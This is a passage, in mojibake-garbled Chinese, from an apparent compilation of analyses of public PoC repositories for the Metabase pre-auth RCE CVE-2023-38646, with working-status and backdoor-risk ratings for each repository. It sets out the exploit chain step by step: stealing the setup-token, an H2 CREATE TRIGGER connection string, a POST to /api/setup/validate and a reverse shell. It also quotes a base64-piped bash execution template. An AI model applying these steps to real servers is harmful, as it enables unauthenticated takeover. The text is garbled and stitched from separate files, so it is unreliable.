    *   å®ƒä½¿ç”¨ `command_encoding` å‡½æ•°å¯¹å‘½ä»¤è¿›è¡Œ Base64 ç¼–ç ï¼Œå¹¶å¤„ç†å¡«å……å­—ç¬¦ `=`ã€‚
    *   å®ƒæ„é€ åŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚
    *   å®ƒå‘é€ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ã€‚

4.  **æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„ PoC ä»£ç ï¼Œè¯¥ PoC æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

5.  **æŠ•æ¯’é£é™©ï¼š**
    *   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å¹¶å‘é€æ¶æ„è¯·æ±‚ï¼Œé£é™©è¾ƒä½ã€‚
    *   `command_encoding` å‡½æ•°çœ‹èµ·æ¥æ­£å¸¸ï¼Œç”¨äºé¿å…Base64ç¼–ç ä¸­çš„å¡«å……å­—ç¬¦çš„é—®é¢˜ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å­˜åœ¨å…¶ä»–ç¼–ç æ¼æ´ã€‚
    *   ä»£ç æ˜ç¡®å£°æ˜ä»…ç”¨äºæ•™è‚²ç›®çš„ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…æ¤å…¥åé—¨çš„å¯èƒ½ã€‚
    *   æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œå¤§æ¦‚åœ¨1%å·¦å³ã€‚ä¸»è¦é£é™©åœ¨äºä½¿ç”¨è€…æ˜¯å¦ä¼šç”¨æ­¤ä»£ç æ‰§è¡Œéæ³•æ“ä½œã€‚

ç»¼ä¸Šæ‰€è¿°ï¼ŒCVE-2023-38646 æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æä¾›çš„ PoC ä»£ç å¯ä»¥æœ‰æ•ˆåˆ©ç”¨è¯¥æ¼æ´ï¼Œä½¿ç”¨è€…åº”è¯¥è°¨æ…å¯¹å¾…ï¼Œé¿å…æ»¥ç”¨ã€‚ä»£ç æœ¬èº«å…·æœ‰è½»å¾®çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦åœ¨äºç¼–ç å’Œå£°æ˜çš„å…è´£å£°æ˜ä¹‹é—´çš„æ½œåœ¨çŸ›ç›¾ã€‚

**é¡¹ç›®åœ°å€:** [UserConnecting/Exploit-CVE-2023-38646-Metabase](https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #14

**æ¥æº**: [CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md](../2023/CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®Œå…¨æ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®æˆ–å·²å®Œæˆåˆå§‹è®¾ç½®ä½†æœªæ‰§è¡Œåç»­å®‰å…¨åŠ å›ºã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœä»¥åŠæä¾›çš„PoCä»£ç ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚å­˜åœ¨å¤šä¸ªå…¬å¼€çš„PoCï¼Œè¯æ˜è¯¥æ¼æ´å¯ä»¥è¢«æˆåŠŸåˆ©ç”¨ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-POC.py` æ—¨åœ¨è·å– Metabase å®ä¾‹çš„ setup-tokenã€‚å¦‚æœ Metabase å®ä¾‹å¤„äºæœªè®¾ç½®çŠ¶æ€ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤ token è¿›è¡Œåˆå§‹åŒ–è®¾ç½®ï¼Œå¹¶è¿›ä¸€æ­¥åˆ©ç”¨å…¶ RCE çš„èƒ½åŠ›ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-Reverse-Shell.py` å¯èƒ½ç”¨äºæ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨ï¼Œå°è¯•è·å–Metabaseçš„ç‰ˆæœ¬ä¿¡æ¯å’Œsetup tokenã€‚

**æŠ•æ¯’é£é™©ï¼š**

PoC ä»£ç  `CVE-2023-38646-POC.py` ä¸»è¦åŠŸèƒ½æ˜¯å‘ç°æœªé…ç½®çš„ Metabase å®ä¾‹å¹¶è·å– setup tokenï¼Œæœ¬èº«æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä½†æ˜¯ï¼Œä¸èƒ½å®Œå…¨æ’é™¤å…¶ä½œè€…åœ¨ä»£ç ä¸­éšè—æ¶æ„ä»£ç çš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚åœ¨è·å– token åå°è¯•æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œæˆ–è€…å°† token å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ã€‚é£é™©è¯„ä¼°ä¸º 10%ã€‚

PoC ä»£ç  `CVE-2023-38646-Reverse-Shell.py` åŒæ ·æ˜¯æ¼æ´åˆ©ç”¨ç›¸å…³ï¼Œä¸»è¦æ¶‰åŠè·å–setup tokenç­‰ä¿¡æ¯ã€‚éœ€è¦äººå·¥å®¡è®¡è¯¥éƒ¨åˆ†ä»£ç ï¼Œè¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¿¡æ¯æ”¶é›†ï¼š** æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡ Metabase å®ä¾‹çš„ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ã€‚é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹å¯ä»¥è·å– Metabase ç‰ˆæœ¬ã€‚
2.  **è·å–Setup Token (å¦‚æœæœªè®¾ç½®):** å¦‚æœ Metabase å®ä¾‹å°šæœªå®Œæˆåˆå§‹åŒ–è®¾ç½®ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å– setup-tokenã€‚è¿™ä¸ªtokenå¯ä»¥ç”¨æ¥å®ŒæˆMetabaseçš„åˆå§‹åŒ–ã€‚
3.  **æ‰§è¡Œä»»æ„ä»£ç ï¼š**  åˆ©ç”¨è·å–çš„setup tokenæˆ–è€…å…¶ä»–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„è¯·æ±‚æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚å…·ä½“ RCE çš„åˆ©ç”¨æ–¹å¼å¯èƒ½æ¶‰åŠå¤šä¸ªæ­¥éª¤ï¼Œä¾‹å¦‚é€šè¿‡åˆ›å»ºä¸€ä¸ªæ¶æ„çš„æ•°æ®æºæˆ–ä»ªè¡¨æ¿ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚

æ€»è€Œè¨€ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨ç›¸å¯¹ç®€å•ï¼Œå±å®³æ€§æé«˜ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œå…¨æ§åˆ¶å—å½±å“çš„ Metabase æœåŠ¡å™¨ã€‚ 

**é¡¹ç›®åœ°å€:** [XiaomingX/cve-2023-38646-poc](https://github.com/XiaomingX/cve-2023-38646-poc)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #15

**æ¥æº**: [CVE-2023-38646-Zenmovie_CVE-2023-38646.md](../2023/CVE-2023-38646-Zenmovie_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ç‰ˆæœ¬ï¼Œ1.46.6.1ä¹‹å‰Enterpriseç‰ˆæœ¬ï¼Œä»¥åŠå…¶ä»–å—å½±å“çš„å›ºå®šç‰ˆæœ¬ä¹‹å‰çš„ç‰ˆæœ¬

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹å¯ä»æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§å¾ˆé«˜ã€‚

**æœ‰æ•ˆæ€§:**

*   æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æœç´¢å¼•æ“ç»“æœç¡®è®¤äº†è¯¥æ¼æ´çš„ä¸¥é‡æ€§ï¼Œå¹¶æä¾›äº†å¤šä¸ªå…³äºè¯¥æ¼æ´çš„æè¿°ã€å½±å“å’ŒæŠ€æœ¯ç»†èŠ‚çš„ç½‘é¡µé“¾æ¥ï¼ŒåŒ…æ‹¬PoCä»£ç çš„GitHubé“¾æ¥ã€‚
*   æä¾›çš„PoCä»£ç  (`CVE-2023-38646.py`) çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå®ƒåˆ©ç”¨äº† Metabase çš„ `setup-token` å’Œ H2 æ•°æ®åº“çš„ç‰¹æ€§æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **è·å– Setup Token å’Œ Metabase ç‰ˆæœ¬:** PoC é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæ£€ç´¢ `setup-token` å’Œ Metabase ç‰ˆæœ¬ã€‚
2.  **æ„é€  Payload:**  æ„å»ºåå¼¹ shell çš„ payload, å¹¶å¯¹å…¶è¿›è¡Œ Base64 ç¼–ç ã€‚
3.  **æ„é€ Exploitæ•°æ®:** PoC æ„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON æ•°æ®ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ªåˆ©ç”¨ `CREATE TRIGGER` çš„ payloadï¼Œè¯¥è§¦å‘å™¨åœ¨ `INFORMATION_SCHEMA.TABLES` ä¸Šæ‰§è¡Œ `SELECT` æ“ä½œä¹‹å‰æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`token` å­—æ®µæ‹¼æ¥äº† setup token å’Œ base64 ç¼–ç åçš„ payloadã€‚
4.  **å‘é€æ¶æ„è¯·æ±‚:** PoC å‘ `/api/setup/validate` å‘é€å¸¦æœ‰æ„é€ çš„ JSON æ•°æ®çš„ POST è¯·æ±‚ã€‚è¿™ä¸ªè¯·æ±‚ä¼šè§¦å‘ H2 æ•°æ®åº“è¿æ¥å’Œè§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©:**

PoCä»£ç æœ¬èº«çš„åå¼¹shellè¿æ¥åœ°å€æ˜¯å¯ä»¥é…ç½®çš„, å¦‚æœä½œè€…æƒ³æŠ•æ¯’,å¯ä»¥å°†IPåœ°å€å†™æ­»,æˆ–è€…åŠ å…¥å…¶ä»–æ¶æ„æ“ä½œ.
*   æ¼æ´åˆ©ç”¨ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå…¶ç›®çš„æ˜¯æ˜ç¡®çš„ã€‚
*   `README.md` æ–‡ä»¶åªåŒ…å« PoC çš„åŸºæœ¬ä¿¡æ¯ã€‚

å› æ­¤ï¼Œè¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½, å¤§æ¦‚åœ¨10%å·¦å³ã€‚æŠ•æ¯’çš„ä¸»è¦é£é™©åœ¨äºæ¶æ„ä¿®æ”¹payloadï¼Œä¾‹å¦‚åå¼¹shellåœ°å€æˆ–è€…æ’å…¥å…¶ä»–çš„æ¶æ„æ“ä½œã€‚

**é¡¹ç›®åœ°å€:** [Zenmovie/CVE-2023-38646](https://github.com/Zenmovie/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #16

**æ¥æº**: [CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md](../2023/CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md)

# CVE-2023-38646

> ğŸ“¦ è¯¥CVEæœ‰ **27** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md](../2023/CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md)

## CVE-2023-38646 - Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯å…¬å¼€è®¿é—®æˆ–æ”»å‡»è€…ä½äºåŒä¸€ç½‘ç»œ

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè·å¾—æœåŠ¡å™¨æƒé™ã€‚æ¼æ´å­˜åœ¨äº Metabase 0.46.6.1 ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ 1.46.6.1 ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æ ¹æ®æœç´¢ç»“æœï¼Œå·²ç»æœ‰å…¬å¼€çš„ PoC ä»£ç å¯ç”¨ (ä¾‹å¦‚ï¼Œgithub.com/threatHNTR/CVE-2023-38646)ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åŸºäº Assetnote çš„ä¸€ç¯‡å…³äºè¯¥æ¼æ´åˆ†æçš„æ–‡ç« ã€‚å®ƒé€šè¿‡åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥é…ç½®ä¸­æ‰§è¡Œæ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒé€šè¿‡æ„é€ ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥ URLï¼Œåœ¨è¿æ¥æ•°æ®åº“æ—¶è§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š

1.  **æ„é€ æ¶æ„ JSON Payload:**  è¯¥ JSON payload ç”¨äºåˆ›å»ºæˆ–ä¿®æ”¹ Metabase ä¸­çš„æ•°æ®åº“è¿æ¥ã€‚ å…¶ä¸­ `classname` è¢«è®¾ç½®ä¸º `org.h2.Driver` , `subname` åŒ…å«æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²,å­—ç¬¦ä¸²åˆ©ç”¨ H2 çš„ `CREATE TRIGGER` ç‰¹æ€§ï¼Œåœ¨INFORMATION_SCHEMA.TABLESä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨, è¯¥è§¦å‘å™¨ä¼šåœ¨æ¯æ¬¡æŸ¥è¯¢è¯¥è¡¨æ—¶æ‰§è¡ŒåµŒå…¥çš„ JavaScript ä»£ç , JavaScriptä»£ç è´Ÿè´£æ‰§è¡Œå‘½ä»¤.
2.  **å‘é€Payload:** é€šè¿‡å‘é€ POST è¯·æ±‚åˆ° Metabase API ç«¯ç‚¹ï¼ˆé€šå¸¸æ˜¯ /api/setup/validate æˆ–å…¶ä»–ç›¸å…³ç«¯ç‚¹ï¼‰ï¼Œå°†æ„é€ çš„ JSON payload å‘é€ç»™ Metabase æœåŠ¡å™¨ã€‚ç”±äºè¯¥æ¼æ´æ˜¯æœªç»èº«ä»½éªŒè¯çš„ï¼Œå› æ­¤æ— éœ€æä¾›ä»»ä½•èº«ä»½éªŒè¯ä¿¡æ¯ã€‚
3.  **è§¦å‘ RCE:** Metabase æœåŠ¡å™¨å°è¯•ä½¿ç”¨æä¾›çš„é…ç½®è¿æ¥åˆ° H2 æ•°æ®åº“æ—¶ï¼Œæ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ä¼šè¢«è§£æå’Œæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ PoC çš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨è¯¥æ¼æ´ã€‚ åˆ†æä»£ç ï¼Œå‘ç°é«˜é£é™©çš„è¡Œä¸ºæ˜¯æ‰§è¡Œ `java.lang.Runtime.getRuntime().exec('bash -c {echo,BASE64COMMAND}|{base64,-d}|{bash,-i}')`ã€‚è¿™è¡Œä»£ç å…è®¸æ‰§è¡Œä»»æ„çš„ bash å‘½ä»¤ã€‚æŠ•æ¯’é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **å‘½ä»¤æ³¨å…¥é£é™©ï¼š**  è™½ç„¶ä»£ç ä¸­ä½¿ç”¨äº† Base64 ç¼–ç ï¼Œä½†æ”»å‡»è€…ä»ç„¶å¯èƒ½é€šè¿‡ä¿®æ”¹ Base64 ç¼–ç çš„å†…å®¹æ¥æ³¨å…¥æ¶æ„å‘½ä»¤ã€‚
*   **æƒé™æå‡é£é™©ï¼š**  ç”±äºä»£ç ä»¥ Metabase æœåŠ¡å™¨çš„æƒé™è¿è¡Œï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´æå‡æƒé™ã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ä¸»è¦æ¥è‡ªäºå‘½ä»¤æ³¨å…¥çš„å¯èƒ½æ€§ï¼Œä½†è¿™å–å†³äºå¦‚ä½•ä½¿ç”¨å’Œä¿®æ”¹ PoCã€‚æ•´ä½“æŠ•æ¯’å¯èƒ½æ€§è¾ƒä½ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦1%ã€‚å› ä¸ºä½œè€…å·²ç»è¯´æ˜äº†è¿™æ˜¯ä¸€ä¸ªæ¼æ´çš„æ‰©å±•ï¼Œæ„åœ¨è§£å†³ä¸€äº›ç‰¹å®šæƒ…å†µä¸‹çš„åˆ©ç”¨é—®é¢˜ï¼Œå¹¶ä¸”ä¸»è¦ä»£ç é€»è¾‘æ˜¯åˆ©ç”¨å·²çŸ¥æ¼æ´ï¼Œè€Œä¸æ˜¯å¼•å…¥æ–°çš„ã€éšè”½çš„æ¶æ„ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [0utl4nder/Another-Metabase-RCE-CVE-2023-38646](https://github.com/0utl4nder/Another-Metabase-RCE-CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #2

**æ¥æº**: [CVE-2023-38646-AnvithLobo_CVE-2023-38646.md](../2023/CVE-2023-38646-AnvithLobo_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯é€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨å»ºç«‹æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œé¢„å…ˆè®¾å®šçš„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **è·å–Tokenï¼š** é¦–å…ˆï¼Œé€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å–ä¸€ä¸ªsetup tokenã€‚
2.  **æ„é€ Payloadï¼š**  ç„¶åï¼Œæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åˆ©ç”¨`CREATE TRIGGER`è¯­å¥åˆ›å»ºè§¦å‘å™¨ï¼Œåœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œå‰è§¦å‘ã€‚è§¦å‘å™¨æ‰§è¡Œçš„JavaScriptä»£ç ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
3.  **Base64ç¼–ç ï¼š** ä½¿ç”¨Base64å¯¹åå‘shellæŒ‡ä»¤è¿›è¡Œç¼–ç ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦å½±å“ã€‚
4.  **å‘é€Payloadï¼š**  æœ€åï¼Œå°†æ„é€ å¥½çš„JSON payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚

**æœ‰æ•ˆæ€§ï¼š**  æä¾›çš„PoCä»£ç æœ‰æ•ˆï¼Œå¯ä»¥æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©ï¼š**  ä»£ç ä¸­æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è„šæœ¬çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å¹¶æ‰§è¡Œåå‘shellã€‚ä½œè€…æä¾›çš„ä»£ç é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ¶æ„ä»£ç ç‰‡æ®µæˆ–è€…éšè—çš„åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½ä¸æè¿°ä¸€è‡´ï¼Œç›®çš„æ˜¯åˆ©ç”¨Metabaseçš„æ¼æ´æ¥è·å–è¿œç¨‹ä»£ç æ‰§è¡Œæƒé™ã€‚å› æ­¤, æŠ•æ¯’é£é™©è¯„ä¼°ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [AnvithLobo/CVE-2023-38646](https://github.com/AnvithLobo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #3

**æ¥æº**: [CVE-2023-38646-Boogipop_MetabaseRceTools.md](../2023/CVE-2023-38646-Boogipop_MetabaseRceTools.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1, Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™çº§åˆ«ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼åˆ†æå¦‚ä¸‹ï¼š

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

